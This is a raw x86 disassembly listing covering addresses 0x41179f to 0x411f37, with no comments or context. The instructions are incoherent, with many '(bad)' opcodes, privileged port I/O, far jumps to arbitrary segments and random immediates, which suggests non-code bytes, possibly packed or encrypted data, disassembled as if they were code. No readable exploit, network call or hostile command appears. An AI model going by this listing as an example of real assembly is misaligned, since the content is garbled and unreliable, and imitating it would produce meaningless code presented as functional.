  41179f:	sbb    BYTE PTR [eax],0x70
  4117a2:	inc    esi
  4117a3:	jmp    0x81717ee8
  4117a8:	(bad)  
  4117a9:	es push esp
  4117ab:	mov    es,WORD PTR [ebx]
  4117ad:	jge    0x41174b
  4117af:	mov    ebp,0xd55a85e8
  4117b4:	mov    WORD PTR [ecx+0x69e9d078],cs
  4117ba:	pop    ds
  4117bb:	and    dl,BYTE PTR [ecx-0x1e21b535]
  4117c1:	lea    edx,[ecx]
  4117c3:	in     al,0xb8
  4117c5:	fstp   QWORD PTR [esi+0x4b631843]
  4117cb:	mov    ds:0x46824e9a,eax
  4117d0:	jb     0x41178f
  4117d2:	out    dx,eax
  4117d3:	enter  0xe778,0x3b
  4117d7:	dec    ebx
  4117d8:	lods   eax,DWORD PTR ds:[esi]
  4117d9:	jmp    0xae6d:0x4e0600ec
  4117e0:	jp     0x4117bf
  4117e2:	inc    esi
  4117e3:	cmp    DWORD PTR [edx-0x7c462946],esi
  4117e9:	mov    cl,bl
  4117eb:	mov    ecx,0x77bf70b7
  4117f0:	adc    al,0xe1
  4117f2:	mov    DWORD PTR ds:0x711f0e5a,edi
  4117f8:	ins    BYTE PTR es:[edi],dx
  4117f9:	(bad)  
  4117fa:	jmp    0x41185e
  4117fc:	out    dx,eax
  4117fd:	imul   edx,DWORD PTR [edi+0x7e],0x7f423817
  411804:	xor    edi,edi
  411806:	dec    ebx
  411807:	jmp    0xddc9:0xe6cc1fd3
  41180e:	push   ebx
  41180f:	arpl   WORD PTR [ecx-0x78],di
  411812:	and    DWORD PTR [esi+0x3aff0d29],edi
  411818:	xor    BYTE PTR [ebx],cl
  41181a:	push   edx
  41181b:	jb     0x411803
  41181d:	pop    ss
  41181e:	adc    ch,BYTE PTR [ecx+0x73ed89c1]
  411824:	dec    esp
  411825:	aaa    
  411826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411827:	call   0x3425b187
  41182c:	cmc    
  41182d:	add    eax,DWORD PTR [ebx+ebp*4+0x72e058e2]
  411834:	mov    WORD PTR [ecx],gs
  411836:	push   edx
  411837:	arpl   WORD PTR [esi+0x44],dx
  41183a:	xor    eax,0xd3331add
  41183f:	push   ebx
  411840:	adc    cl,ch
  411842:	test   eax,0x3006bbd8
  411847:	mov    al,0x4b
  411849:	scas   al,BYTE PTR es:[edi]
  41184a:	hlt    
  41184b:	inc    ecx
  41184c:	mov    ds:0x26859360,eax
  411851:	out    0xcb,eax
  411853:	mov    ?,WORD PTR [eax+edx*2]
  411856:	dec    eax
  411857:	imul   edx,DWORD PTR [esi+0x522e1ce0],0x10
  41185e:	mov    ds:0x9d0aca26,al
  411863:	out    0x9,eax
  411865:	adc    ebx,edx
  411867:	or     DWORD PTR [ebx],esi
  411869:	add    eax,0xe0f930d7
  41186e:	cmp    al,0xa3
  411870:	iret   
  411871:	js     0x4118a8
  411873:	gs popf 
  411875:	call   0xf924:0x934595c2
  41187c:	out    0x5,eax
  41187e:	and    ecx,DWORD PTR [edi-0x71456037]
  411884:	(bad)  
  411885:	into   
  411886:	xchg   ebx,eax
  411887:	loopne 0x41188d
  411889:	retf   
  41188a:	jno    0x411884
  41188c:	mov    bh,0x20
  41188e:	and    eax,0x92b89945
  411893:	ja     0x411836
  411895:	jp     0x41181d
  411897:	and    DWORD PTR [esi-0x73206643],ebx
  41189d:	jecxz  0x411827
  41189f:	sbb    DWORD PTR [ebp-0x7a],esp
  4118a2:	(bad)  
  4118a3:	bnd jge 0x411913
  4118a6:	jg     0x4118a4
  4118a8:	lea    edi,[ebp+0x3a883d2e]
  4118ae:	nop
  4118af:	pop    eax
  4118b0:	mov    WORD PTR [ebx+0x7897b335],gs
  4118b6:	jl     0x411885
  4118b8:	outs   dx,BYTE PTR ds:[esi]
  4118b9:	ja     0x41188a
  4118bb:	sbb    al,0x6b
  4118bd:	es cli 
  4118bf:	je     0x41184b
  4118c1:	ds pop es
  4118c3:	mov    bl,0x55
  4118c5:	es inc esi
  4118c7:	js     0x4118e9
  4118c9:	jp     0x411892
  4118cb:	sub    BYTE PTR [esi+esi*4+0x2875f42e],0x19
  4118d3:	and    al,0x60
  4118d5:	push   edx
  4118d6:	and    al,0xb5
  4118d8:	int    0x98
  4118da:	mov    edi,edx
  4118dc:	and    DWORD PTR [edx],esp
  4118de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118df:	leave  
  4118e0:	inc    ecx
  4118e1:	xor    eax,0x38981477
  4118e6:	mov    ebp,0x4e4d4ae
  4118eb:	mov    ds:0xa65282e4,eax
  4118f0:	jge    0x411906
  4118f2:	test   bh,0x11
  4118f5:	loopne 0x41192c
  4118f7:	int3   
  4118f8:	ret    
  4118f9:	mov    eax,ds:0xea95ace7
  4118fe:	int3   
  4118ff:	fsubrp st(6),st
  411901:	outs   dx,BYTE PTR ds:[esi]
  411902:	ja     0x41192e
  411904:	jg     0x41195e
  411906:	idiv   BYTE PTR [ecx+0x24]
  411909:	push   edi
  41190a:	or     ah,cl
  41190c:	shl    ebp,1
  41190e:	xor    DWORD PTR [ecx],eax
  411910:	inc    edx
  411911:	add    ch,dl
  411913:	in     al,0x6c
  411915:	das    
  411916:	jnp    0x4118e4
  411918:	std    
  411919:	inc    edi
  41191a:	pop    es
  41191b:	or     al,0x4f
  41191d:	lods   eax,DWORD PTR ds:[esi]
  41191e:	mul    BYTE PTR [ebx-0x1e3023cf]
  411924:	in     al,dx
  411925:	outs   dx,BYTE PTR ds:[esi]
  411926:	(bad)  
  411927:	fdiv   DWORD PTR [esi]
  411929:	mov    ch,0x7b
  41192b:	out    dx,eax
  41192c:	loope  0x41190d
  41192e:	leave  
  41192f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411930:	fld    QWORD PTR ss:[ebx]
  411933:	repz aaa 
  411935:	cmp    ecx,DWORD PTR [ebx]
  411937:	pop    ss
  411938:	fdiv   st(6),st
  41193a:	outs   dx,BYTE PTR ds:[esi]
  41193b:	xchg   edi,eax
  41193c:	ret    
  41193d:	jmp    0x7b74:0x5bbce260
  411944:	mov    ecx,0xc2e839f0
  411949:	pop    ds
  41194a:	jno    0x4119a9
  41194c:	rol    DWORD PTR [edx],1
  41194e:	cmp    esi,DWORD PTR [esi]
  411950:	popa   
  411951:	dec    esi
  411952:	data16 aam 0xbd
  411955:	xchg   ebx,eax
  411956:	push   es
  411957:	pushf  
  411958:	xchg   esp,eax
  411959:	aas    
  41195a:	in     al,0x6
  41195c:	mov    esp,cs
  41195e:	iret   
  41195f:	aad    0xc7
  411961:	fild   WORD PTR [edx-0x16980928]
  411967:	test   DWORD PTR [esi],esp
  411969:	jecxz  0x41195c
  41196b:	sub    al,0xce
  41196d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41196e:	push   ecx
  41196f:	or     edi,ebx
  411971:	(bad)  
  411973:	adc    al,BYTE PTR [ebx]
  411975:	in     al,0xb1
  411977:	loop   0x4119b9
  411979:	sbb    eax,0x4fa07dce
  41197e:	pop    ss
  41197f:	jg     0x411925
  411981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411982:	xchg   edi,eax
  411983:	ins    BYTE PTR es:[edi],dx
  411984:	test   al,0x3
  411986:	ror    DWORD PTR [edi-0x2],cl
  411989:	dec    edx
  41198a:	pop    ebx
  41198b:	add    ecx,DWORD PTR [ecx+0x1c]
  41198e:	stc    
  41198f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411990:	sbb    BYTE PTR [ecx+0x2a57233f],cl
  411996:	pop    ss
  411997:	gs scas eax,DWORD PTR es:[edi]
  411999:	call   DWORD PTR [ebp-0x47e61147]
  41199f:	and    edi,edx
  4119a1:	xchg   ebp,eax
  4119a2:	push   ecx
  4119a3:	popa   
  4119a4:	sub    BYTE PTR [esi],cl
  4119a6:	ins    BYTE PTR es:[edi],dx
  4119a7:	mov    ds:0xfdfc26e9,al
  4119ac:	adc    DWORD PTR [ecx-0x62],ebx
  4119af:	xlat   BYTE PTR ds:[ebx]
  4119b0:	cmp    bh,al
  4119b2:	inc    ebx
  4119b3:	jnp    0x4119e6
  4119b5:	in     eax,dx
  4119b6:	inc    edi
  4119b7:	(bad)  
  4119b8:	(bad)  
  4119ba:	dec    esp
  4119bb:	push   esi
  4119bc:	test   DWORD PTR [edx-0xfdacb0d],ecx
  4119c2:	dec    edi
  4119c3:	and    esi,DWORD PTR ds:0x7e11f71d
  4119c9:	xor    ebx,esi
  4119cb:	mov    dh,0x79
  4119cd:	into   
  4119ce:	jge    0x4119d9
  4119d0:	cmp    BYTE PTR [esp+ebx*1+0x611ee453],ch
  4119d7:	fcom   QWORD PTR [esi+0x9]
  4119da:	mov    bl,0x3
  4119dc:	sahf   
  4119dd:	push   ecx
  4119de:	fstp   TBYTE PTR [edi]
  4119e0:	mov    eax,0xa4ee6c5
  4119e5:	sbb    DWORD PTR [esi-0x5900b387],0x5c
  4119ec:	mov    bh,0x4b
  4119ee:	fcom   DWORD PTR [esi+0x27]
  4119f1:	mov    BYTE PTR [ebx],al
  4119f3:	add    al,0xf3
  4119f5:	test   BYTE PTR [edx],bh
  4119f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f8:	stos   BYTE PTR es:[edi],al
  4119f9:	add    cl,bl
  4119fb:	inc    ebx
  4119fc:	ins    DWORD PTR es:[edi],dx
  4119fd:	sbb    al,0xa7
  4119ff:	aas    
  411a00:	cmp    al,0x10
  411a02:	push   esi
  411a03:	cld    
  411a04:	cld    
  411a05:	push   esp
  411a06:	outs   dx,DWORD PTR ds:[esi]
  411a07:	or     dh,bh
  411a09:	ja     0x411a03
  411a0b:	daa    
  411a0c:	add    ecx,ecx
  411a0e:	imul   edx,DWORD PTR [eax+ecx*1+0x2f],0xffffffa3
  411a13:	aam    0xe0
  411a15:	mov    ebx,0xca89bfe9
  411a1a:	sahf   
  411a1b:	ins    BYTE PTR es:[edi],dx
  411a1c:	sub    BYTE PTR [edx-0x110457de],0x75
  411a23:	(bad)  
  411a24:	sub    BYTE PTR [edi],al
  411a26:	arpl   WORD PTR [edx-0x5c],bp
  411a29:	add    DWORD PTR [edi],edx
  411a2b:	fstp   QWORD PTR [edx]
  411a2d:	jle    0x411a1c
  411a2f:	daa    
  411a30:	push   ecx
  411a31:	stc    
  411a32:	pop    esp
  411a33:	repnz mov ds:0x435e3a79,al
  411a39:	in     al,0x2b
  411a3b:	or     ecx,ebx
  411a3d:	stos   DWORD PTR es:[edi],eax
  411a3e:	add    edi,edx
  411a40:	xor    ecx,DWORD PTR [edi]
  411a42:	xchg   DWORD PTR [ecx+ebp*8+0x15],ebp
  411a46:	mov    ecx,gs
  411a48:	test   eax,0x62e3c684
  411a4d:	loop   0x411a73
  411a4f:	adc    BYTE PTR [ebx+esi*1-0x5486e62],dl
  411a56:	and    eax,0x96dabedb
  411a5b:	ficom  WORD PTR [bx+si-0x18]
  411a5f:	repz loopne 0x411a89
  411a62:	xchg   bh,cl
  411a64:	xor    BYTE PTR [ebx],dh
  411a66:	or     cl,BYTE PTR [edi+0x3b]
  411a69:	and    eax,0xfffffff6
  411a6c:	(bad)  
  411a6d:	outs   dx,DWORD PTR ds:[esi]
  411a6e:	mov    bl,0xe7
  411a70:	adc    esp,DWORD PTR [edi-0x7ad26870]
  411a76:	inc    esi
  411a77:	jb     0x411ac5
  411a79:	inc    ebp
  411a7a:	cmp    eax,0x8b5c0e45
  411a7f:	inc    esi
  411a80:	das    
  411a81:	mov    dl,0xd0
  411a83:	xor    BYTE PTR [edx-0x7b],ch
  411a86:	or     bh,dl
  411a88:	push   eax
  411a89:	pop    ds
  411a8a:	pushf  
  411a8b:	xor    BYTE PTR [edi],al
  411a8d:	scas   eax,DWORD PTR es:[edi]
  411a8e:	sub    eax,0x477a0fa8
  411a93:	adc    dh,bl
  411a95:	cmp    ecx,DWORD PTR [ecx]
  411a97:	(bad)  
  411a99:	push   ds
  411a9a:	push   ebp
  411a9b:	sbb    eax,0xe668fd53
  411aa0:	psraw  mm7,QWORD PTR [esp+ebx*8]
  411aa4:	stos   DWORD PTR es:[edi],eax
  411aa5:	shl    ecx,1
  411aa7:	out    dx,eax
  411aa8:	pusha  
  411aa9:	lock lock stos BYTE PTR es:[edi],al
  411aac:	aas    
  411aad:	and    edx,0x9c63e494
  411ab3:	and    eax,0xc11a8ee
  411ab8:	enter  0x63d2,0x9d
  411abc:	cdq    
  411abd:	dec    eax
  411abe:	jns    0x411a7b
  411ac0:	(bad)  
  411ac1:	add    ch,BYTE PTR [ecx+0x41e4fc24]
  411ac7:	cld    
  411ac8:	push   0xfffffffa
  411aca:	hlt    
  411acb:	shr    DWORD PTR [edi],cl
  411acd:	aas    
  411ace:	inc    esp
  411acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad0:	fdivr  st,st(2)
  411ad2:	pop    ds
  411ad3:	aam    0xa
  411ad5:	das    
  411ad6:	mov    ds:0x5cf4243a,al
  411adb:	rep stos DWORD PTR es:[edi],eax
  411add:	xchg   ebx,eax
  411ade:	xlat   BYTE PTR ds:[ebx]
  411adf:	mov    al,ds:0x3ad5b900
  411ae4:	test   bh,0xd2
  411ae7:	add    al,0xff
  411ae9:	or     ebp,DWORD PTR [edi+0x4f8da9ea]
  411aef:	pop    ebx
  411af0:	repz pop ebp
  411af2:	and    al,0xad
  411af4:	dec    esp
  411af5:	mov    bl,BYTE PTR [eax-0x142337eb]
  411afb:	icebp  
  411afc:	(bad)  
  411afd:	mov    bl,0xc
  411aff:	lahf   
  411b00:	sbb    ch,BYTE PTR [eax+0x40]
  411b03:	dec    esp
  411b04:	xchg   ecx,eax
  411b05:	cs js  0x411ab0
  411b08:	lea    edx,[eax+0x5641184d]
  411b0e:	js     0x411b86
  411b10:	sub    BYTE PTR [ebp+0x786f6b28],bh
  411b16:	adc    DWORD PTR [eax+ebx*1],ebx
  411b19:	pop    es
  411b1a:	push   ebx
  411b1b:	in     eax,dx
  411b1c:	ins    BYTE PTR es:[edi],dx
  411b1d:	inc    ebp
  411b1e:	rcr    DWORD PTR [ebp-0x2bd202d3],1
  411b24:	jmp    0xf36:0x6cb72daa
  411b2b:	in     eax,dx
  411b2c:	fild   WORD PTR [eax-0x414a4a25]
  411b32:	or     dl,BYTE PTR [edx-0x581fb58f]
  411b38:	sub    ah,BYTE PTR [edi]
  411b3a:	outs   dx,DWORD PTR ds:[esi]
  411b3b:	addr16 icebp 
  411b3d:	bound  ecx,QWORD PTR [esi-0x477d97ab]
  411b43:	or     BYTE PTR [edx],0xea
  411b46:	les    ebx,FWORD PTR [edx-0x35]
  411b49:	pop    edx
  411b4a:	inc    ecx
  411b4b:	das    
  411b4c:	adc    eax,0xb19b622c
  411b51:	pop    DWORD PTR [edx]
  411b53:	sub    al,0xe3
  411b55:	stc    
  411b56:	loope  0x411b22
  411b58:	and    DWORD PTR [edi-0x3c],ebx
  411b5b:	fist   WORD PTR [edi-0xfdc7cf]
  411b61:	sbb    BYTE PTR [edx+0xf],al
  411b64:	cmp    esi,DWORD PTR [edx-0x70]
  411b67:	pop    es
  411b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b69:	sbb    DWORD PTR [edx-0x15402243],edi
  411b6f:	xor    ch,BYTE PTR [edx+0x76e8a0ac]
  411b75:	mov    DWORD PTR [edi],eax
  411b77:	sub    DWORD PTR [ebx],esp
  411b79:	adc    BYTE PTR [edi+0x55],cl
  411b7c:	mov    eax,ds:0xf95510e6
  411b81:	call   0xd801:0x516eeec0
  411b88:	lods   al,BYTE PTR ds:[esi]
  411b89:	or     eax,0x5aed46a
  411b8e:	addr16 xchg ebx,eax
  411b90:	cmp    ah,BYTE PTR [edi-0x33]
  411b93:	enter  0x97cc,0x94
  411b97:	in     al,dx
  411b98:	adc    al,0x35
  411b9a:	and    al,0xd5
  411b9d:	xchg   edx,eax
  411b9e:	xor    eax,0x92681f4b
  411ba3:	fisubr DWORD PTR [ecx]
  411ba5:	test   al,ah
  411ba7:	add    eax,0x26790a12
  411bac:	stos   BYTE PTR es:[edi],al
  411bad:	sub    ecx,0x4a
  411bb0:	xchg   esp,eax
  411bb1:	stc    
  411bb2:	or     al,0x1c
  411bb4:	rcl    ecx,1
  411bb6:	scas   eax,DWORD PTR es:[edi]
  411bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb8:	ds inc ecx
  411bba:	xor    dh,bl
  411bbc:	xor    bl,BYTE PTR [eax]
  411bbe:	test   DWORD PTR [edx+eax*1+0x12],ecx
  411bc2:	jle    0x411b8f
  411bc4:	dec    edi
  411bc5:	mov    bh,0xf9
  411bc7:	dec    esp
  411bc8:	fcomip st,st(3)
  411bca:	pop    edx
  411bcb:	shl    ecx,1
  411bcd:	inc    eax
  411bce:	lods   eax,DWORD PTR ds:[esi]
  411bcf:	pop    esp
  411bd0:	xchg   esi,eax
  411bd1:	jecxz  0x411c0f
  411bd3:	pop    ecx
  411bd4:	scas   al,BYTE PTR es:[edi]
  411bd5:	dec    esi
  411bd6:	push   eax
  411bd7:	dec    ebx
  411bd8:	lods   al,BYTE PTR ds:[esi]
  411bd9:	gs nop
  411bdb:	scas   eax,DWORD PTR es:[edi]
  411bdc:	or     esp,DWORD PTR [edi+0x39cd6685]
  411be2:	push   0x8b3a6481
  411be7:	or     esi,DWORD PTR [ecx]
  411be9:	dec    esp
  411bea:	add    BYTE PTR [edx-0x59a58e7e],dh
  411bf0:	mov    ah,0xa7
  411bf2:	sahf   
  411bf3:	or     al,ch
  411bf5:	int3   
  411bf6:	dec    esi
  411bf7:	pop    edx
  411bf8:	push   es
  411bf9:	pop    ebp
  411bfa:	mov    dh,BYTE PTR [ecx-0xa187dab]
  411c00:	inc    ebx
  411c01:	adc    al,BYTE PTR [ecx+0x19]
  411c04:	or     al,0x50
  411c06:	xor    BYTE PTR [edi-0x2a0c480f],bl
  411c0c:	lock and edi,DWORD PTR [edi]
  411c0f:	xor    eax,0x457a4e25
  411c14:	in     eax,0x87
  411c16:	imul   ecx,DWORD PTR [edx-0x36],0x72
  411c1a:	(bad)  
  411c1c:	sti    
  411c1d:	sar    DWORD PTR [edi],cl
  411c1f:	(bad)  
  411c20:	idiv   BYTE PTR [ebp+0x627a896f]
  411c26:	pop    ds
  411c27:	add    eax,0xd521207a
  411c2c:	dec    ebx
  411c2d:	jb     0x411c28
  411c2f:	add    eax,0x528dc415
  411c34:	int    0x95
  411c36:	int    0x87
  411c38:	sahf   
  411c39:	and    eax,0x1225f563
  411c3e:	sahf   
  411c3f:	mov    eax,ds:0xbb895f63
  411c44:	pop    es
  411c45:	(bad)  
  411c46:	adc    BYTE PTR [ebx+0x64a386c1],al
  411c4c:	mov    ah,0xdc
  411c4e:	adc    esp,0x190cc255
  411c54:	dec    edx
  411c55:	jecxz  0x411c56
  411c57:	ja     0x411c1e
  411c59:	out    dx,al
  411c5a:	or     al,0x2c
  411c5c:	int    0xad
  411c5e:	ss jne 0x411cd1
  411c61:	(bad)  
  411c62:	call   0x2628536e
  411c67:	mov    DWORD PTR [edi+0xa],edx
  411c6a:	aad    0xed
  411c6c:	xchg   eax,esi
  411c6e:	das    
  411c6f:	jae    0x411c0a
  411c71:	sbb    eax,0xa794349a
  411c76:	(bad)  
  411c77:	ds jmp 0x904d305d
  411c7d:	loopne 0x411c47
  411c7f:	fnstcw WORD PTR [ebx+0x65]
  411c82:	lea    edi,[ebx+ebx*2-0x50]
  411c86:	add    ch,BYTE PTR [ecx-0x15]
  411c89:	imul   ecx,DWORD PTR [esi-0x16],0xb13674ab
  411c90:	jne    0x411c47
  411c92:	outs   dx,DWORD PTR ds:[esi]
  411c93:	jns    0x411c7e
  411c95:	sub    DWORD PTR [ecx+ecx*8],eax
  411c98:	mov    al,BYTE PTR [edi-0x30871e9e]
  411c9e:	inc    esi
  411c9f:	pop    ds
  411ca0:	push   edx
  411ca1:	mov    DWORD PTR [ecx+esi*2],0xe1841363
  411ca8:	or     BYTE PTR [edx+0x13e4a658],al
  411cae:	add    ecx,DWORD PTR [ecx-0xb15a040]
  411cb4:	in     eax,0x8e
  411cb6:	mov    eax,0x8690c46d
  411cbb:	jns    0x411c62
  411cbd:	dec    eax
  411cbe:	add    al,0x6b
  411cc0:	rol    DWORD PTR [ecx],0x78
  411cc3:	(bad)  
  411cc4:	lods   eax,DWORD PTR ds:[esi]
  411cc5:	ror    bl,1
  411cc7:	aad    0x48
  411cc9:	push   0xff790c1b
  411cce:	pop    ss
  411ccf:	lods   al,BYTE PTR ds:[esi]
  411cd0:	mov    bl,0xd1
  411cd2:	leave  
  411cd3:	xchg   edx,eax
  411cd4:	mov    dl,0xfb
  411cd6:	sub    DWORD PTR [edx-0x11e036dc],0x96969de5
  411ce0:	cld    
  411ce1:	repnz sbb al,BYTE PTR [ebp+0x23]
  411ce5:	push   esi
  411ce6:	test   DWORD PTR [ecx-0x7e2f4d0a],0x1c510e76
  411cf0:	xor    eax,0x11976fd3
  411cf5:	sbb    ah,BYTE PTR [eax]
  411cf7:	push   ecx
  411cf8:	mov    ecx,0x939cb9c2
  411cfd:	test   al,0xfa
  411cff:	dec    ecx
  411d00:	or     BYTE PTR [ecx+edx*8],al
  411d03:	mov    bl,0x12
  411d05:	shr    BYTE PTR [esi+0x2a166d12],cl
  411d0b:	ja     0x411ce4
  411d0d:	jo     0x411d3e
  411d0f:	add    bh,ah
  411d11:	xchg   ebx,esp
  411d13:	fsub   QWORD PTR [ebp+0x3ee7db68]
  411d19:	or     eax,0xd5dfeda7
  411d1e:	into   
  411d1f:	push   edi
  411d20:	mov    al,0x2d
  411d22:	hlt    
  411d23:	xchg   BYTE PTR [edx-0x7d],dh
  411d26:	jne    0x411cb0
  411d28:	stc    
  411d29:	rcl    DWORD PTR [ebp+0x43b1ac22],0xd4
  411d30:	ret    
  411d31:	imul   esi,DWORD PTR [edi],0xc80f4f34
  411d37:	jno    0x411d1e
  411d39:	jae    0x411d3c
  411d3b:	js     0x411d48
  411d3d:	rol    BYTE PTR [ebx+0x1a],cl
  411d40:	and    BYTE PTR [ebp+0x29aa8a41],ch
  411d46:	dec    esp
  411d47:	imul   edx,DWORD PTR [esi-0x1aa3ecb8],0x5c
  411d4e:	mov    WORD PTR [esi+0x25],gs
  411d51:	stos   DWORD PTR es:[edi],eax
  411d52:	or     ebx,eax
  411d54:	push   ebx
  411d55:	mov    esp,0x3250c7e4
  411d5a:	scas   eax,DWORD PTR es:[edi]
  411d5b:	in     al,dx
  411d5c:	pop    edx
  411d5d:	pop    ds
  411d5e:	icebp  
  411d5f:	push   0x95188f92
  411d64:	fist   WORD PTR [eax-0x2c6dc1de]
  411d6a:	ja     0x411dcd
  411d6c:	lds    eax,FWORD PTR [esi+0x6d3f13d]
  411d72:	adc    al,0xe7
  411d74:	mov    BYTE PTR [ecx-0x5c],0x82
  411d78:	fxtract 
  411d7a:	sbb    edx,DWORD PTR [ecx-0x7c4206bf]
  411d80:	or     eax,0xbf927684
  411d85:	inc    edi
  411d86:	push   es
  411d87:	add    al,0xe1
  411d89:	scas   al,BYTE PTR es:[edi]
  411d8a:	sbb    DWORD PTR [edx-0x47e7ec85],ecx
  411d90:	add    DWORD PTR [edi+eax*4+0x63bf8111],ebx
  411d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d98:	push   cs
  411d99:	adc    DWORD PTR [eax],0x5a4b0ddb
  411d9f:	xchg   edx,eax
  411da0:	mov    bl,0x80
  411da2:	hlt    
  411da3:	jmp    0xb6639172
  411da8:	push   0x3f9ebbd2
  411dad:	mov    al,BYTE PTR [edi+0x2e495a6d]
  411db3:	inc    ebx
  411db4:	lea    esi,[edx-0x7cc252c3]
  411dba:	arpl   bx,si
  411dbc:	xchg   edx,eax
  411dbd:	jo     0x411d76
  411dbf:	push   ebp
  411dc0:	test   al,0x2e
  411dc2:	outs   dx,BYTE PTR ds:[esi]
  411dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc4:	call   0xd1f3:0xd342dab7
  411dcb:	iret   
  411dcc:	ret    0xdac9
  411dcf:	retf   0xb93f
  411dd2:	test   edi,edx
  411dd4:	cdq    
  411dd5:	pop    ebp
  411dd6:	sbb    esi,DWORD PTR [edi-0x67]
  411dd9:	ficomp DWORD PTR [edi-0x428d8bad]
  411ddf:	cmp    al,0x81
  411de1:	push   edi
  411de2:	jb     0x411d9e
  411de4:	jns    0x411df1
  411de6:	outs   dx,BYTE PTR ds:[esi]
  411de7:	int3   
  411de8:	jnp    0x411e59
  411dea:	outs   dx,BYTE PTR ds:[esi]
  411deb:	adc    dh,dl
  411ded:	or     bh,BYTE PTR [esi+0x62]
  411df0:	(bad)  
  411df1:	push   edx
  411df2:	cwde   
  411df3:	fcom   DWORD PTR fs:[ecx+0x78]
  411df7:	outs   dx,DWORD PTR ds:[esi]
  411df8:	test   al,0x87
  411dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dfb:	sub    ah,BYTE PTR [edx-0x4be1de59]
  411e01:	outs   dx,BYTE PTR ds:[esi]
  411e02:	mov    dh,0x65
  411e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e05:	jge    0x411d9f
  411e07:	and    eax,0x5709ca2
  411e0c:	xchg   edi,eax
  411e0d:	or     bh,BYTE PTR [ebx+ecx*8-0x36a87710]
  411e14:	xor    DWORD PTR [ebx],ecx
  411e16:	add    BYTE PTR [edx],0xcc
  411e19:	and    edx,eax
  411e1b:	nop
  411e1c:	call   0xbffdbce
  411e21:	and    ecx,DWORD PTR [edx-0x6ff1869c]
  411e27:	xor    al,0xeb
  411e29:	pushf  
  411e2a:	(bad)  
  411e2b:	fdiv   QWORD PTR [ebx]
  411e2d:	push   esi
  411e2e:	ja     0x411e17
  411e30:	loope  0x411e92
  411e32:	xor    al,0x8
  411e34:	out    dx,al
  411e35:	pop    ss
  411e36:	mov    eax,0x89c7e791
  411e3b:	out    dx,eax
  411e3c:	mov    ss,WORD PTR [esi+0x6c]
  411e3f:	add    DWORD PTR [ecx-0x64],edi
  411e42:	fiadd  WORD PTR [ecx]
  411e44:	enter  0xcfdd,0xa0
  411e48:	mov    ds:0xa6293b44,al
  411e4d:	push   ecx
  411e4e:	adc    eax,0x4b6b6901
  411e53:	mov    ecx,0x170f57a0
  411e58:	fwait
  411e59:	cmp    bh,BYTE PTR [eax+0x14d77e0a]
  411e5f:	sub    DWORD PTR [ebp-0x2],ebx
  411e62:	(bad)  
  411e63:	stos   BYTE PTR es:[edi],al
  411e64:	mov    ecx,0x93a3971e
  411e69:	jo     0x411e8a
  411e6b:	iret   
  411e6c:	push   esp
  411e6d:	es mov dh,0x1d
  411e70:	sub    DWORD PTR [eax-0x11],ebx
  411e73:	leave  
  411e74:	retf   0xd5a8
  411e77:	sbb    esp,0xa
  411e7a:	xchg   edx,edx
  411e7c:	cmp    BYTE PTR [ebx-0x219fae3],ah
  411e82:	mov    al,0x9e
  411e84:	mov    ebx,0xfade0536
  411e89:	mov    ebp,0xd191f615
  411e8e:	mov    eax,ds:0x88e6839e
  411e94:	repnz mov al,0x3b
  411e97:	jle    0x411e4d
  411e99:	js     0x411eea
  411e9b:	enter  0x6d5e,0x5c
  411e9f:	lds    edx,FWORD PTR fs:[ebx+0x1e]
  411ea3:	or     al,ah
  411ea5:	mov    eax,ds:0x61735b7e
  411eaa:	cmc    
  411eab:	gs push es
  411ead:	enter  0xadbd,0x75
  411eb1:	add    al,0xc5
  411eb3:	es ret 
  411eb5:	mov    BYTE PTR [ecx],0x6f
  411eb8:	mov    DWORD PTR [edi],eax
  411eba:	loopne 0x411efb
  411ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ebd:	mov    DWORD PTR [ecx-0x4d895cbf],esp
  411ec3:	adc    edi,DWORD PTR [ebx]
  411ec5:	jp     0x411f05
  411ec7:	sbb    BYTE PTR [ecx],ah
  411ec9:	sbb    eax,0xee341f45
  411ece:	fisubr WORD PTR [edi-0x19]
  411ed1:	push   esi
  411ed2:	aaa    
  411ed3:	adc    BYTE PTR [edi-0x74],bl
  411ed6:	(bad)  
  411ed7:	retf   0xc893
  411eda:	or     DWORD PTR [esi-0x5308c459],ebp
  411ee0:	cmp    DWORD PTR [edi+0x60],ebp
  411ee3:	ret    
  411ee4:	shl    DWORD PTR [esi+edi*1],0xd9
  411ee8:	inc    esi
  411ee9:	daa    
  411eea:	adc    dl,ch
  411eec:	ror    BYTE PTR [eax-0x37],0xff
  411ef0:	mov    ds:0x5c533080,al
  411ef5:	cmc    
  411ef6:	or     esi,DWORD PTR fs:[ebx-0x6867c474]
  411efd:	iret   
  411efe:	gs add esp,ebx
  411f01:	and    DWORD PTR [ecx],0x58
  411f04:	adc    BYTE PTR [edx],ch
  411f06:	xchg   esp,eax
  411f07:	dec    eax
  411f08:	lods   eax,DWORD PTR ds:[esi]
  411f09:	in     eax,dx
  411f0a:	add    ch,al
  411f0c:	sbb    ah,BYTE PTR [ebp-0x23]
  411f0f:	pop    eax
  411f10:	int    0x86
  411f12:	cmc    
  411f13:	mov    ch,0x11
  411f15:	adc    DWORD PTR [edi-0xa],ebx
  411f18:	ss pushf 
  411f1a:	lods   eax,DWORD PTR ds:[esi]
  411f1b:	repnz stos BYTE PTR es:[edi],al
  411f1d:	cmovbe esi,DWORD PTR [edx+0x7de01b06]
  411f24:	mov    cl,0xf1
  411f26:	(bad)  
  411f27:	loope  0x411f78
  411f29:	(bad)  [ebx-0x37e5432b]
  411f2f:	or     BYTE PTR [ebp-0x20],al
  411f32:	pop    ss
  411f33:	xor    ch,BYTE PTR [esi+0x74]
  411f36:	sahf   
  411f37:	(bad)
